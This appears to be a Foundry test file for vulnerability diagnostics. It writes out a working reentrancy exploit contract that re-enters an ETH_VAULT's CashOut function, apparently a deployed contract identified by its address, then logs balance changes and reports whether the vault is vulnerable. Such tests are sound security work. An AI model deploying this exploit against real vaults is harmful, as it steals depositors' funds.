// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x8c7777c45481dba411450c228cb692ac3d550344.sol";

contract MaliciousContract {
    ETH_VAULT public vault;
    uint public attackCount;
    uint public amount;

    constructor(ETH_VAULT _vault, uint _amount) {
        vault = _vault;
        amount = _amount;
    }

    function deposit() public payable {
        // Deposit funds to be able to withdraw later
        vault.Deposit{value: msg.value}();
    }

    function attack() public {
        // Start the reentrancy attack
        vault.CashOut(amount);
    }

    receive() external payable {
        // Reentrancy attack - call CashOut again before balance is updated
        if (attackCount < 1) {
            attackCount++;
            vault.CashOut(amount);
        }
    }
}

contract ETHVaultTest is Test {
    ETH_VAULT public vault;
    Log public transferLog; // Renamed from 'log' to avoid conflict
    MaliciousContract public attacker;
    address public owner = makeAddr("owner");
    address public user = makeAddr("user");
    uint public attackAmount = 1 ether;

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(user, 10 ether);

        vm.prank(owner);
        transferLog = new Log();

        vm.prank(owner);
        vault = new ETH_VAULT(address(transferLog));
    }

    function testReentrancyAttack() public {
        // Print separator for clarity
        console.log("=========== Vulnerabiliy Diagnostics ===========");
        
        // Deploy malicious contract
        attacker = new MaliciousContract(vault, attackAmount);

        // Fund the malicious contract
        vm.deal(address(attacker), 2 ether);
        attacker.deposit{value: 2 ether}();

        // [DIFF] Record initial state before attack
        console.log("--- BEFORE ATTACK STATE ---");
        uint256 vaultBalanceBefore = address(vault).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerDepositBefore = vault.balances(address(attacker));
        
        console.log("Vault ETH balance:          ", vaultBalanceBefore);
        console.log("Attacker ETH balance:       ", attackerBalanceBefore);
        console.log("Attacker vault deposit:     ", attackerDepositBefore);
        console.log("----------------------------");

        // Execute attack
        console.log("--- TRIGGER: REENTRANCY ATTACK EXECUTION ---");
        attacker.attack();

        // [DIFF] Record state after attack
        console.log("\n--- AFTER ATTACK STATE ---");
        uint256 vaultBalanceAfter = address(vault).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerDepositAfter = vault.balances(address(attacker));
        
        console.log("Vault ETH balance:          ", vaultBalanceAfter);
        console.log("Attacker ETH balance:       ", attackerBalanceAfter);
        console.log("Attacker vault deposit:     ", attackerDepositAfter);
        console.log("----------------------------");
        
        // [DIFF] Calculate balance changes
        uint256 vaultChange = vaultBalanceBefore - vaultBalanceAfter;
        uint256 attackerChange = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Change in vault ETH:       -", vaultChange);
        console.log("Change in attacker ETH:    +", attackerChange);
        
        // [DIFF] Validate if attack caused abnormal state changes
        bool hasAnomalousDecrease = vaultChange > attackAmount; // Should be >1 ether
        bool hasExcessWithdrawal = vaultChange > attackerDepositBefore; // Withdrawn > deposited
        bool hasInconsistentDeposit = attackerDepositAfter > 0; // Should be drained to 0

        // Vulnerability exists if any anomaly is detected
        bool vulnerabilityExists = hasAnomalousDecrease || 
                                   hasExcessWithdrawal || 
                                   hasInconsistentDeposit;
        
        console.log("--- VERDICT ---");
        console.log("Anomalous vault decrease:       ", hasAnomalousDecrease ? "YES" : "NO");
        console.log("Excess withdrawal detected:     ", hasExcessWithdrawal  ? "YES" : "NO");
        console.log("Inconsistent deposit accounting:", hasInconsistentDeposit ? "YES" : "NO");

        // Final vulnerability determination
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Abnormal state changes indicating reentrancy exploitation");
        } else {
            console.log("Vulnerability not Exist: No abnormal state changes detected");
        }
    }
}